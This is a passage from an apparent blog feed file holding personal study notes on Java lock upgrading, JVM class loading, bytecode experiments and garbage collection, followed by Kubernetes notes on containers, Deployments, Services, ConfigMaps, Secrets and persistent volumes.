    <content><![CDATA[<h2 id="Java-Lock"><a href="#Java-Lock" class="headerlink" title="Java Lock"></a>Java Lock</h2><h3 id="锁升级"><a href="#锁升级" class="headerlink" title="锁升级"></a>锁升级</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/08/12/java-lock/%E9%94%81%E5%8D%87%E7%BA%A7%E8%BF%87%E7%A8%8B.png"
                      class="" title="锁升级过程"
                >]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Lock</tag>
      </tags>
  </entry>
  <entry>
    <title>JVM notes</title>
    <url>/2020/09/18/jvm/</url>
    <content><![CDATA[<h2 id="How-java-code-run"><a href="#How-java-code-run" class="headerlink" title="How java code run?"></a>How java code run?</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://files.trickmaster.cn/ab5c3523af08e0bf2f689c1d6033ef77.png"
                      alt="ab5c3523af08e0bf2f689c1d6033ef77"
                ></p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">public class Foo &#123;</span></span><br><span class="line"><span class="string"> public static void main(String[] args) &#123;</span></span><br><span class="line"><span class="string">  boolean flag = true;</span></span><br><span class="line"><span class="string">  if (flag) System.out.println(&quot;Hello, Java!&quot;);</span></span><br><span class="line"><span class="string">  if (flag == true) System.out.println(&quot;Hello, JVM!&quot;);</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> &gt; Foo.java</span><br><span class="line">$ javac Foo.java</span><br><span class="line">$ java Foo</span><br><span class="line">$ java -<span class="built_in">cp</span> ./asmtools-6.0/lib/asmtools.jar org.openjdk.asmtools.jdis.Main Foo.class &gt; Foo.jasm.1</span><br><span class="line">$ awk <span class="string">&#x27;NR==1,/iconst_1/&#123;sub(/iconst_1/, &quot;iconst_2&quot;)&#125; 1&#x27;</span> Foo.jasm.1 &gt; Foo.jasm</span><br><span class="line">$ java -<span class="built_in">cp</span> ./asmtools-6.0/lib/asmtools.jar org.openjdk.asmtools.jasm.Main Foo.jasm <span class="comment"># recompile</span></span><br><span class="line">$ java Foo</span><br></pre></td></tr></table></figure></div>

<p>Check the change:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ diff Foo.jasm Foo.jasm.1 </span><br><span class="line">18c18</span><br><span class="line">&lt; 		iconst_2;</span><br><span class="line">---</span><br><span class="line">&gt; 		iconst_1;</span><br></pre></td></tr></table></figure></div>

<h2 id="Java-basic-types"><a href="#Java-basic-types" class="headerlink" title="Java basic types"></a>Java basic types</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://files.trickmaster.cn/77dfb788a8ad5877e77fc28ed2d51745.png"
                      alt="basic types"
                ></p>
<h2 id="Class-Loader"><a href="#Class-Loader" class="headerlink" title="Class Loader"></a>Class Loader</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://files.trickmaster.cn/java_classloader_hierarchy.png"
                      alt="java_classloader_hierarchy"
                ></p>
<h3 id="load"><a href="#load" class="headerlink" title="load"></a>load</h3><blockquote>
<p>tips: In this time,JVM has generated the class structure and write in the method area</p>
</blockquote>
<ol>
<li><p>Every class loader inherit java.lang.ClassLoader except boot class loader.</p>
<ul>
<li>Boot: jre&#x2F;lib, Xbootclasspath</li>
<li>Extension: ext, dirs</li>
<li>Application:</li>
</ul>
</li>
<li><p>JAVA9: change extension to platform which would load almost all modules except important moudles such as java.base.</p>
</li>
<li><p>Class unique ID: result of class loader object and class full path name.</p>
</li>
</ol>
<h3 id="link"><a href="#link" class="headerlink" title="link"></a>link</h3><blockquote>
<p>tips: get the address of method instead of class.</p>
</blockquote>
<ol>
<li><p>Valid byte for jvm criterion.</p>
</li>
<li><p>Prepare</p>
<ul>
<li>Allocate memory</li>
<li>Construct layer about class such as method table which realize dynamic binding of virtual method.</li>
</ul>
</li>
<li><p>analyze</p>
<ul>
<li>resolve these symbols to actual refference</li>
</ul>
</li>
</ol>
<p>Besides: Java machine specification not require finish the analyze in the link process, it just has provisions that the necessity of resolving symbol refference before execute the corresponding byte code.</p>
<h3 id="init-process"><a href="#init-process" class="headerlink" title="init process"></a>init process</h3><ol>
<li><p><code>final static [basic type or String]</code> will be signed ConstantValue and init directly by jvm. Besides, all of directly assignment and static block code will be put in the same method and rename as <code>&lt;clinit&gt;</code>.</p>
</li>
<li><p>JVM will use block method to ensure teh clinit method only be executed once.(And the feature always be used to realized singleton lazy init process)</p>
</li>
<li><p>When will the init process be triggered:</p>
<ul>
<li>JVM start, init user settle Main class</li>
<li><code>new</code> the aim class</li>
<li>instructions: call static method, init over class</li>
<li>instructions: visit static field init over class</li>
<li>child class init trigger parent class init</li>
<li>default method defined in interface will result in interface init process.</li>
<li>reflection init class</li>
<li>the first call MethodHandle object, init the class where methodHandle locate.</li>
</ul>
</li>
</ol>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Singleton &#123;</span><br><span class="line">  private Singleton() &#123;&#125;</span><br><span class="line">  private static class LazyHolder &#123;</span><br><span class="line">    static final Singleton INSTANCE = new Singleton();</span><br><span class="line">  &#125;</span><br><span class="line">  public static Singleton getInstance() &#123;</span><br><span class="line">    return LazyHolder.INSTANCE;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>The above code:<br>    Only class Singleton.getInstance, program will visit LazyHolder.INSTANCE, then trigger the process of LazyHolder init and create a Singleton object.</p>
<p>Practice:</p>
<p><code>JVM: -verbose:class</code> will print the order of class loading and special symbol before LazyHolder method.</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$ echo &#x27;</span><br><span class="line">public class Singleton &#123;</span><br><span class="line">  private Singleton() &#123;&#125;</span><br><span class="line">  private static class LazyHolder &#123;</span><br><span class="line">    static final Singleton INSTANCE = new Singleton();</span><br><span class="line">    static &#123;</span><br><span class="line">      System.out.println(&quot;LazyHolder.&lt;clinit&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  public static Object getInstance(boolean flag) &#123;</span><br><span class="line">    if (flag) return new LazyHolder[2];</span><br><span class="line">    return LazyHolder.INSTANCE;</span><br><span class="line">  &#125;</span><br><span class="line">  public static void main(String[] args) &#123;</span><br><span class="line">    getInstance(true);</span><br><span class="line">    System.out.println(&quot;----&quot;);</span><br><span class="line">    getInstance(false);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;&#x27; &gt; Singleton.java</span><br><span class="line">$ javac Singleton.java</span><br><span class="line">$ java -verbose:class Singleton</span><br></pre></td></tr></table></figure></div>

<p>Problem:<br>new array whether result in LazyHolder load or init?</p>
<p>A: load not init.</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ java -cp /path/to/asmtools.jar org.openjdk.asmtools.jdis.Main Singleton\$LazyHolder.class &gt; Singleton\$LazyHolder.jasm.1</span><br><span class="line">$ awk &#x27;NR==1,/stack 1/&#123;sub(/stack 1/, &quot;stack 0&quot;)&#125; 1&#x27; Singleton\$LazyHolder.jasm.1 &gt; Singleton\$LazyHolder.jasm</span><br><span class="line">$ java -cp /path/to/asmtools.jar org.openjdk.asmtools.jasm.Main Singleton\$LazyHolder.jasm</span><br><span class="line">$ java -verbose:class Singleton</span><br></pre></td></tr></table></figure></div>

<p>Problem2:<br>new array will result in link of LazyHolder?</p>
<p>A: No.(while getInstance(false) will link and init)</p>
<h2 id="How-do-JVM-call-method"><a href="#How-do-JVM-call-method" class="headerlink" title="How do JVM call method?"></a>How do JVM call method?</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">void invoke(Object obj, Object... args) &#123; ... &#125;</span><br><span class="line">void invoke(String s, Object obj, Object... args) &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">invoke(null, 1);    // call second</span><br><span class="line">invoke(null, 1, 2); // call second</span><br><span class="line">invoke(null, new Object[]&#123;1&#125;); // call first invoke</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="jvm-实战"><a href="#jvm-实战" class="headerlink" title="jvm 实战"></a>jvm 实战</h3><p>本文内容笔记主要来自</p>
<ol>
<li>mashibing: <a class="link"   href="http://www.mashibing.com/" >http://www.mashibing.com/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li>以及深入理解JVM虚拟机</li>
<li>以及深入拆解Java虚拟机（郑雨迪）极客时间 <a class="link"   href="https://time.geekbang.org/column/article/41245" >https://time.geekbang.org/column/article/41245<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ol>
<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>在 HotSpot 里面，上述翻译过程有两种形式：</p>
<p>第一种是解释执行，即逐条将字节码翻译成机器码并执行；</p>
<p>第二种是即时编译（Just-In-Time compilation，JIT），即将一个方法中包含的所有字节码编译成机器码后再执行。</p>
<h2 id="Java-字节码"><a href="#Java-字节码" class="headerlink" title="Java 字节码"></a>Java 字节码</h2><h2 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h2><p>在 Java 中，正无穷和负无穷是有确切的值，在内存中分别等同于十六进制整数 0x7F800000 和 0xFF800000。<br> [0x7F800001, 0x7FFFFFFF]和[0xFF800001, 0xFFFFFFFF] 对应的浮点数是 NaN（Not-a-Number）</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Foo</span> &#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="type">boolean</span> boolValue;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    boolValue = <span class="literal">true</span>; <span class="comment">// 将这个true替换为2或者3，再看看打印结果</span></span><br><span class="line">    <span class="keyword">if</span> (boolValue) System.out.println(<span class="string">&quot;Hello, Java!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (boolValue == <span class="literal">true</span>) System.out.println(<span class="string">&quot;Hello, JVM!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//当替换为2的时候无输出</span></span><br><span class="line"><span class="comment">//当替换为3的时候打印HelloJava及HelloJVM</span></span><br><span class="line"><span class="comment">//猜测是因为将boolean 保存在静态域中,指定了其类型为&#x27;Z&#x27;</span></span><br><span class="line"><span class="comment">//当修改为2时取低位最后一位为0,当修改为3时取低位最后一位为1则说明boolean的掩码处理是取低位的最后一位</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="类加载-查找字节流的过程"><a href="#类加载-查找字节流的过程" class="headerlink" title="类加载 查找字节流的过程"></a>类加载 查找字节流的过程</h2><p>双亲委派模型</p>
<h3 id="三个GC算法"><a href="#三个GC算法" class="headerlink" title="三个GC算法"></a>三个GC算法</h3><ol>
<li><p>mark sweep: 标记清除，标记后进行清除，所以碎片化</p>
</li>
<li><p>copy: 标记后统一整理放到一侧，然后对另一侧大扫除。由于 Eden 的特点是大量产生，大量销毁，因此很适用copy。使用时只需将Eden 少量存活的copy到 survivor1 中，然后对 Eden<br> 区进行清理即可。 等到二次回收时会将 eden 区的以及 survivor1 的一起复制到 survivor2 当中去。</p>
</li>
</ol>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/09/18/jvm/copy.png"
                      class="" title="copy algorithm"
                >


<ol start="3">
<li>mark compact: 一边清一边压缩，时刻保持内存紧致。对于老年代这种对象一般都存活很久的就很适用。</li>
</ol>
<h3 id="10-个-Garbage-collector"><a href="#10-个-Garbage-collector" class="headerlink" title="10 个 Garbage collector"></a>10 个 Garbage collector</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/09/18/jvm/gc.png"
                      class="" title="Garbage collector"
                >

<ul>
<li>Epsilon: 跟进追踪，不做任何回收，常用来 debug 或者不需要回收的场景</li>
</ul>
<h4 id="分代模型"><a href="#分代模型" class="headerlink" title="分代模型"></a>分代模型</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/09/18/jvm/process-object-gc.png"
                      class="" title="Garbage collector"
                >


<h4 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h4><ol>
<li>top 查内存占用</li>
</ol>
<hr>
<ol start="2">
<li><p>jps 列出系统中java 的进程</p>
</li>
<li><p>jinfo pid 拿到基本信息</p>
</li>
<li><p>jstack pid | more 罗列出所有线程的调用栈状态</p>
</li>
</ol>
<p>上面仨命令常用来定位 死锁</p>
<hr>
<ol start="5">
<li><p>jstat -gc 不好用，效果不直观</p>
</li>
<li><p>arthas 基本命令：</p>
<ul>
<li>dashboard 类似 top，能给出基本占用信息：如果是JVM没有报OOM便退出了，建议排查堆外内存</li>
<li>jvm 类似 jinfo 输出使用 JVM的相关信息比如使用的GC，memory 等</li>
<li>thread 类似 jstack，加 -b 参数可用于排查死锁</li>
<li>redefine 重定义 class 类似字节码插桩</li>
</ul>
</li>
<li><p>jmap -histo pid 定位哪些对象在吃内存</p>
<ul>
<li>jmap -dump:format&#x3D;b.file&#x3D;xxx.hprof 2366</li>
</ul>
</li>
</ol>
<blockquote>
<p>实际实例 <a class="link"   href="https://mp.weixin.qq.com/s?__biz=Mzg3MTEyMjUyMQ==&mid=2247483765&idx=1&sn=1c20adaae37a9c11bed1c3d2964909d0&chksm=ce821243f9f59b55eec0ebf5beb3d660668151bd46c03ded25c0fd731c3ff188faea3c0b3c53&mpshare=1&scene=23&srcid=0827zNKbMDdpJCoIv9omeEZs&sharer_sharetime=1598580051461&sharer_shareid=162a8816dfe520fecd477f663aaf4f98#rd" >https://mp.weixin.qq.com/s?__biz=Mzg3MTEyMjUyMQ==&amp;mid=2247483765&amp;idx=1&amp;sn=1c20adaae37a9c11bed1c3d2964909d0&amp;chksm=ce821243f9f59b55eec0ebf5beb3d660668151bd46c03ded25c0fd731c3ff188faea3c0b3c53&amp;mpshare=1&amp;scene=23&amp;srcid=0827zNKbMDdpJCoIv9omeEZs&amp;sharer_sharetime=1598580051461&amp;sharer_shareid=162a8816dfe520fecd477f663aaf4f98#rd<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
<h4 id="OQL-学习"><a href="#OQL-学习" class="headerlink" title="OQL 学习"></a>OQL 学习</h4>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>JVM</tag>
        <tag>Deployment</tag>
      </tags>
  </entry>
  <entry>
    <title>K8s</title>
    <url>/2020/09/19/k8s/</url>
    <content><![CDATA[<h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><h3 id="基础理解"><a href="#基础理解" class="headerlink" title="基础理解"></a>基础理解</h3><blockquote>
<p>容器本身没有价值，有价值的是“容器编排”</p>
</blockquote>
<ol>
<li><p>容器技术的核心功能，就是通过约束和修改进程的动态表现，从而为其创造出一个“边界“</p>
</li>
<li><p>对于 Docker 等大多数 Linux 容器来说，Cgroups 技术是用来制造约束的主要手段，而<br>Namespace 技术则是用来修改进程视图的主要方法。</p>
<ul>
<li><code>int pid = clone(main_function, stack_size, CLONE_NEWPID | SIGCHLD, NULL);</code></li>
<li>这时，新创建的这个进程将会“看到”一个全新的进程空间，在这个进程空间里，它的 PID<br>是 1。之所以说“看到”，是因为这只是一个“障眼法”，在宿主机真实的进程空间里，这<br>个进程的 PID 还是真实的数值，比如 100。</li>
</ul>
</li>
<li><p>使用虚拟化技术作为应用沙盒，就必须要由 Hypervisor 来负责创建虚拟机，这个虚拟机是真实存在的，并且它里面必须运行一个完整的 Guest OS 才能执行用户的应用 进程。这就不可避免地带来了额外的资源消耗和占用.</p>
<ul>
<li>而相比之下，容器化后的用户应用，却依然还是一个宿主机上的普通进程，这就意味着这些<br>因为虚拟化而带来的性能损耗都是不存在的；而另一方面，使用 Namespace 作为隔离手<br>段的容器并不需要单独的 Guest OS，这就使得容器额外的资源占用几乎可以忽略不计</li>
</ul>
</li>
<li><p>其次，在 Linux 内核中，有很多资源和对象是不能被 Namespace 化的，最典型的例子就是：时间。</p>
</li>
<li><p>“容器”这个术语长期以来都被用于形容被 Cgroups 限制过的进程组。后来 Google 的工程师们说，他们的 KVM 虚拟机 也运行在 Borg 所管理的“容器”里，其实也是运行在 Cgroups“容器”当中。这和我们 今天说的 Docker 容器差别很大</p>
</li>
<li><p>Linux Cgroups 的全称是 Linux Control Group。它最主要的作用，就是限制一个进程组能够使用的资源上限，包括 CPU、内存、磁盘、网络带宽等等</p>
</li>
<li><p>Cgroups 还能够对进程进行优先级设置、审计，以及将进程挂起和恢复等</p>
</li>
<li><p>找到 so 文件可以用 ldd 命令 <code>ldd /bin/ls | egrep -o &#39;/lib.*\.[0-9]&#39;</code></p>
<ul>
<li><ol>
<li>启用 Linux Namespace 配置；</li>
</ol>
</li>
<li><ol start="2">
<li>设置指定的 Cgroups 参数；</li>
</ol>
</li>
<li><ol start="3">
<li>切换进程的根目录（Change Root）。</li>
</ol>
</li>
</ul>
</li>
<li></li>
</ol>
<h3 id="Deployment"><a href="#Deployment" class="headerlink" title="Deployment"></a>Deployment</h3><p>一个Deployment拥有多个Replica Set，而一个Replica Set拥有一个或多个Pod。</p>
<p>一个Deployment控制多个rs主要是为了支持回滚机制，每当Deployment操作时，Kubernetes会重新生成一个Replica Set并保留，以后有需要的话就可以回滚至之前的状态。 </p>
<div class="code-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx-deploy</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">nginx-demo</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">3</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx:1.7.9</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="string">Kubernetes在等待设置的时间后才进行升级</span></span><br><span class="line"><span class="string">如果没有设置该值，Kubernetes会假设该容器启动起来后就提供服务了</span></span><br><span class="line"><span class="string">如果没有设置该值，在某些极端情况下可能会造成服务不正常运行</span></span><br><span class="line"><span class="attr">minReadySeconds:</span> <span class="number">5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">strategy:</span></span><br><span class="line">  <span class="comment"># indicate which strategy we want for rolling update</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">RollingUpdate</span></span><br><span class="line">  <span class="attr">rollingUpdate:</span></span><br><span class="line">    <span class="string">升级过程中最多可以比原先设置多出的POD数量</span></span><br><span class="line">    <span class="string">例如：maxSurage=1，replicas=5,则表示Kubernetes会先启动1一个新的Pod后才删掉一个旧的POD，整个升级过程中最多会有5+1个POD。</span></span><br><span class="line">    <span class="attr">maxSurge:</span> <span class="number">1</span></span><br><span class="line">    <span class="string">升级过程中最多有多少个POD处于无法提供服务的状态</span></span><br><span class="line">    <span class="string">当maxSurge不为0时，该值也不能为0</span></span><br><span class="line">    <span class="string">例如：maxUnavaible=1，则表示Kubernetes整个升级过程中最多会有1个POD处于无法服务的状态。</span></span><br><span class="line">    <span class="attr">maxUnavailable:</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="HPA-自动扩容"><a href="#HPA-自动扩容" class="headerlink" title="HPA 自动扩容"></a>HPA 自动扩容</h3><p>创建命令</p>
<p><code>kubectl autoscale deployment hpa-nginx-deploy --cpu-percent=10 --min=1 --max=10</code></p>
<h3 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h3><blockquote>
<p>能够支持 TCP 和 UDP 协议，默认是 TCP 协议<br>Label Selector 选中给定 pods</p>
</blockquote>
<ul>
<li><p>Node IP：Node节点的IP地址. 集群中节点的物理网卡IP地址(一般为内网)，所有属于这个网络的服务器之间都可以直接通信，所以Kubernetes集群外要想访问Kubernetes集群内部的某个节点或者服务，肯定得通过Node IP进行通信（这个时候一般是通过外网IP了）</p>
</li>
<li><p>Pod IP: Pod的IP地址. Docker Engine根据docker0网桥的IP地址段进行分配的（我们这里使用的是flannel这种网络插件保证所有节点的Pod IP不会冲突）</p>
</li>
<li><p>Cluster IP: Service的IP地址. 一个虚拟的IP，仅仅作用于Kubernetes Service这个对象，由Kubernetes自己来进行管理和分配地址，当然我们也无法ping这个地址，他没有一个真正的实体对象来响应，他只能结合Service Port来组成一个可以通信的服务。</p>
</li>
</ul>
<h4 id="endpoints"><a href="#endpoints" class="headerlink" title="endpoints"></a>endpoints</h4><p>Kubernetes在创建Service时，根据Service的标签选择器（Label Selector）来查找Pod，据此创建与Service同名的EndPoints对象。当Pod的地址发生变化时，EndPoints也随之变化。Service接收到请求时，就能通过EndPoints找到请求转发的目标地址。</p>
<h4 id="kube-proxy"><a href="#kube-proxy" class="headerlink" title="kube-proxy"></a>kube-proxy</h4><p>每个Node会运行一个kube-proxy进程, 负责为Service实现 clusterIP 的代理形式，现在的Kubernetes中默认是使用的iptables这种模式来代理。</p>
<p>这种模式，kube-proxy会监视Kubernetes master对 Service 对象和 Endpoints 对象的添加和移除。 </p>
<p>对每个 Service，它会添加上 iptables 规则，从而捕获到达该 Service 的 clusterIP（虚拟 IP）和端口的请求，进而将请求重定向到 Service 的一组 backend 中的某一个上面。 对于每个 Endpoints 对象，它也会安装 iptables 规则，这个规则会选择一个 backend Pod。</p>
<p>默认的策略是，随机选择一个 backend。 我们也可以实现基于客户端 IP 的会话亲和性，可以将 service.spec.sessionAffinity 的值设置为 “ClientIP” （默认值为 “None”）。</p>
<p>另外需要了解的是如果最开始选择的 Pod 没有响应，iptables 代理能够自动地重试另一个 Pod，所以它需要依赖 readiness probes。</p>
<h4 id="service-type"><a href="#service-type" class="headerlink" title="service type"></a>service type</h4><ul>
<li><p>ClusterIP：通过集群的内部 IP 暴露服务，选择该值，服务只能够在集群内部可以访问，这也是默认的ServiceType。</p>
</li>
<li><p>NodePort：通过每个 Node 节点上的 IP 和静态端口（NodePort）暴露服务。NodePort 服务会路由到 ClusterIP 服务，这个 ClusterIP 服务会自动创建。通过请求，可以从集群的外部访问一个 NodePort 服务。</p>
</li>
<li><p>LoadBalancer：使用云提供商的负载局衡器，可以向外部暴露服务。外部的负载均衡器可以路由到 NodePort 服务和 ClusterIP 服务，这个需要结合具体的云厂商进行操作。</p>
</li>
<li><p>ExternalName：通过返回 CNAME 和它的值，可以将服务映射到 externalName 字段的内容（例如， foo.bar.example.com）。没有任何类型代理被创建，这只有 Kubernetes 1.7 或更高版本的 kube-dns 才支持。</p>
</li>
</ul>
<h3 id="ConfigMap"><a href="#ConfigMap" class="headerlink" title="ConfigMap"></a>ConfigMap</h3><h4 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h4><div class="code-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">$</span> <span class="string">kubectl</span> <span class="string">create</span> <span class="string">configmap</span> <span class="string">cm-demo3</span> <span class="string">--from-literal=db.host=localhost</span> <span class="string">--from-literal=db.port=3306</span></span><br><span class="line"><span class="string">configmap</span> <span class="string">&quot;cm-demo3&quot;</span> <span class="string">created</span></span><br><span class="line"><span class="string">$</span> <span class="string">kubectl</span> <span class="string">get</span> <span class="string">configmap</span> <span class="string">cm-demo3</span> <span class="string">-o</span> <span class="string">yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">data:</span></span><br><span class="line">  <span class="attr">db.host:</span> <span class="string">localhost</span></span><br><span class="line">  <span class="attr">db.port:</span> <span class="string">&quot;3306&quot;</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ConfigMap</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">creationTimestamp:</span> <span class="number">2018-06-14T16:43:12Z</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">cm-demo3</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line">  <span class="attr">resourceVersion:</span> <span class="string">&quot;3111447&quot;</span></span><br><span class="line">  <span class="attr">selfLink:</span> <span class="string">/api/v1/namespaces/default/configmaps/cm-demo3</span></span><br><span class="line">  <span class="attr">uid:</span> <span class="string">06eeec7e-6ff2-11e8-a101-525400db4df7</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><ul>
<li>设置环境变量的值</li>
<li>在容器里设置命令行参数</li>
<li>在数据卷里面创建config文件</li>
</ul>
<div class="code-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">testcm3-pod</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">testcm3</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">busybox</span></span><br><span class="line">      <span class="attr">command:</span> [ <span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;cat /etc/config/redis.conf&quot;</span> ]</span><br><span class="line">      <span class="attr">volumeMounts:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">config-volume</span></span><br><span class="line">        <span class="attr">mountPath:</span> <span class="string">/etc/config</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">config-volume</span></span><br><span class="line">      <span class="attr">configMap:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">cm-demo2</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>tips: 需要注意的是，当ConfigMap以数据卷的形式挂载进Pod的时，这时更新ConfigMap（或删掉重建ConfigMap），Pod内挂载的配置信息会热更新。这时可以增加一些监测配置文件变更的脚本，然后reload对应服务。</p>
</blockquote>
<h3 id="Secret"><a href="#Secret" class="headerlink" title="Secret"></a>Secret</h3><p>kubernetes.io&#x2F;service-account-token，用于被serviceaccount引用。</p>
<p>serviceaccout 创建时 Kubernetes 会默认创建对应的 secret。</p>
<p>Pod 如果使用了 serviceaccount，对应的secret会自动挂载到Pod的&#x2F;run&#x2F;secrets&#x2F;kubernetes.io&#x2F;serviceaccount目录中</p>
<h3 id="RBAC"><a href="#RBAC" class="headerlink" title="RBAC"></a>RBAC</h3><p><a class="link"   href="https://www.qikqiak.com/k8s-book/docs/30.RBAC.html" >https://www.qikqiak.com/k8s-book/docs/30.RBAC.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="PVc"><a href="#PVc" class="headerlink" title="PVc"></a>PVc</h3><p>PV 的全称是：PersistentVolume（持久化卷），是对底层的共享存储的一种抽象，PV 由管理员进行创建和配置，它和具体的底层的共享存储技术的实现方式有关，比如 Ceph、GlusterFS、NFS 等，都是通过插件机制完成与共享存储的对接。</p>
<p>Pod 消耗的是节点，PVC 消耗的是 PV 资源，Pod 可以请求 CPU 和内存，而 PVC 可以请求特定的存储空间和访问模式。</p>
<h3 id="StorageClass-动态-PV"><a href="#StorageClass-动态-PV" class="headerlink" title="StorageClass 动态 PV"></a>StorageClass 动态 PV</h3><p>使用自动配置程序Provisioner 比如 nfs 的 nfs-client</p>
<ul>
<li>自动创建的 PV 以${namespace}-${pvcName}-${pvName}这样的命名格式创建在 NFS 服务器上的共享数据目录中</li>
<li>而当这个 PV 被回收后会以archieved-${namespace}-${pvcName}-${pvName}这样的命名格式存在 NFS 服务器上。</li>
</ul>
<p><a class="link"   href="https://www.qikqiak.com/k8s-book/docs/35.StorageClass.html" >https://www.qikqiak.com/k8s-book/docs/35.StorageClass.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
